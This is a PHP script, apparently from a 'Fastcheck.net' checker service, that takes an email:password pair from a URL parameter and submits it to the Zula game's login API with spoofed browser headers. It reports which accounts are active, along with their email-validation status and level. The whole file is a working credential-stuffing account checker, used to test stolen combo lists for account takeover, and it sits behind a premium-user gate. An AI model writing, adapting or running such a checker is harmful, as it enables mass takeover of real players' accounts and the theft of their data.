<?php
include_once '../includes/baglan.php';


session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}

$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$kullaniciadi = trim($array[0]);
$pw = trim($array[1]);

function cerezs(){
	$cerezs = preg_replace('<\W+>', "", 'cerez').rand(0000000,9999999);
	return $cerezs;
}
$cerezs = cerezs();
if (file_exists(getcwd().'/'.$cerezs.'.txt')) {
    unlink(getcwd().'/'.$cerezs.'.txt');
}
function dogan($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.zulaoyun.com/zula/login/LogOn");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'content-type: application/json; Charset=UTF-8',
    'sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
    'host: api.zulaoyun.com',
    'sec-ch-ua-mobile: ?0',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)',
    'x-requested-with: XMLHttpRequest',
    ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$arr = json_encode(array("Password"=>$pw,"LuaId"=>"ea5b-b632b0e1-118d-10019041-60222364-1a6c","TerminateZula"=>0,"PublisherId"=>1,"DeviceId"=>"7427ea071a6c","Locale"=>"tr","IsCafe"=>0,"Email"=>$kullaniciadi));
curl_setopt($ch, CURLOPT_POSTFIELDS, $arr);
$fim = curl_exec($ch);

$mailonay = dogan($fim, '"IsValidated":', ',"');
$seviye = dogan($fim, '"UserLevel":', '}');

if(strpos($fim, '{"MemberId":"') !== false) {
		 echo "✅ <b>#Aktif</b> - $kullaniciadi : $pw - Mail Onay: $mailonay - Level: $seviye - Hesap Aktif - <b>www.Fastcheck.net</b> <br>";
	}
elseif(strpos($fim, '{\"Id\":2') !== false) {
			 echo "❌ <b>#Kapalı</b> - $kullaniciadi : $pw - Mail Onay: $mailonay - İd Veya Şifre Hatalı - <b>www.Fastcheck.net</b> <br>";
}
else{
    echo "❌ <b>#Kapalı</b> - $kullaniciadi : $pw - Mail Onay: $mailonay - İd Veya Şifre Hatalı - <b>www.Fastcheck.net</b> <br>";
}
curl_close($ch);
?> 